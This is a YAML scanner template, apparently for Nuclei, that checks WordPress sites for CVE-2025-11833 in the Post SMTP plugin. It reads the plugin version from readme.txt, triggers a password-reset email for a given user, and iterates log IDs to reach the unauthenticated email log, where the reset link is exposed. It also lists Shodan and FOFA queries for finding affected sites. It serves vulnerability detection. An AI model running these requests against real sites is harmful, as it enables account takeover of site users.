id: CVE-2025-11833

info:
  name: Post SMTP <= 3.6.0 - Missing Authorization to Account Takeover via Unauthenticated Email Log Disclosure
  author: Kazgangap
  severity: critical
  description: | 
    Post SMTP WordPress plugin <= 3.6.0 contains an unauthorized data access vulnerability caused by missing capability check in __construct function, letting unauthenticated attackers read arbitrary logged emails, exploit requires no authentication.
  impact: | 
    Unauthenticated attackers can read sensitive logged emails, including password reset links, potentially leading to account takeover.
  remediation: | 
    Update to the latest version beyond 3.6.0
  reference:
    - https://github.com/Kazgangap/cve-poc-garage/blob/main/2025/CVE-2025-11833.md
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/post-smtp/post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-360-missing-authorization-to-account-takeover-via-unauthenticated-email-log-disclosure
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-11833
    cwe-id: CWE-862
    cpe: cpe:2.3:a:wpexperts:post_smtp_mailer:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: wpexperts
    product: post_smtp_mailer
    framework: wordpress
    shodan-query: http.html:/wp-content/plugins/post-smtp
    fofa-query: body=/wp-content/plugins/post-smtp
  tags: cve,cve2025,wp-plugin,wordpress,smpt

variables:
  valid_user: "{{valid_user}}"

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/post-smtp/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Post SMTP")'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: version
        part: body
        group: 1
        regex:
          - 'Stable tag:\s*([0-9.]+)'
        internal: true

  - raw:
      - |
        POST /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id={{log_id}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        user_login={{valid_user}}&redirect_to=&wp-submit=Get+New+Password

    payloads:
      log_id: helpers/wordlists/numbers.txt

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'len(body) > 0'
          - 'contains(body, "postmansmtp.com") || contains(body, "Post SMTP") || contains(body, "post-smtp/assets")'
        condition: and

      - type: dsl
        dsl:
          - 'contains(body, "not allowed to access") || contains(body, "no account")'
        negative: true
